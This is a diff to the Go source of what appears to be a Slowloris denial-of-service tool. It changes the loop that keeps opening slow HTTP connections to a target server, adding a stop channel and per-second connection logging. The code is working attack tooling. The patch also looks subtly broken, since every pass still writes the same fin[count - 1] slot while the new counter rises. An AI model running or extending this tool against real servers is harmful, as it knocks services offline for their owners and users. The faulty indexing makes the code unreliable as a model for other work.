@@ -33,7 +33,7 @@ func (s SlowlorisOpt) IsBroadcast() bool {
 	return false
 }
 
-func slowlorisEntry(remainFlags []string) {
+func slowlorisEntry(stopChan chan int, remainFlags []string) {
 	var opts SlowlorisOpt
 
 	opts.UrlFunc = func(rawurl string) {
@@ -93,10 +93,13 @@ func slowlorisEntry(remainFlags []string) {
 		opts.timeout = 0xffffffff
 	}
 
-	slowlorisStart(&opts)
+	slowlorisStart(stopChan, &opts)
 }
 
-func slowlorisStart(opts *SlowlorisOpt) {
+func slowlorisStart(stopChan chan int, opts *SlowlorisOpt) {
+	second := time.Tick(time.Second)
+	var curCount uint = 0
+
 	var throttle <-chan time.Time
 	if opts.Rate() != time.Duration(0) {
 		throttle = time.Tick(opts.Rate())
@@ -105,18 +108,23 @@ func slowlorisStart(opts *SlowlorisOpt) {
 	fin := make([]chan int, count)
 
 	for {
-		if count == 0 {
+		if curCount >= count {
 			break
 		}
-		if count % 10 == 0 && count < opts.Count() {
-			log.Println("10 http connect established")
+		select {
+			case <-second:
+				log.Printf("%d http connect established\n", curCount)
+			case <-stopChan:
+				return
+			default:
+				break
 		}
 		if throttle != nil {
 			<-throttle
 		}
 		fin[count - 1] = make(chan int)
 		go httpConnect(opts, fin[count - 1])
-		count--
+		curCount++
 	}
 
 	for i, _ := range fin {
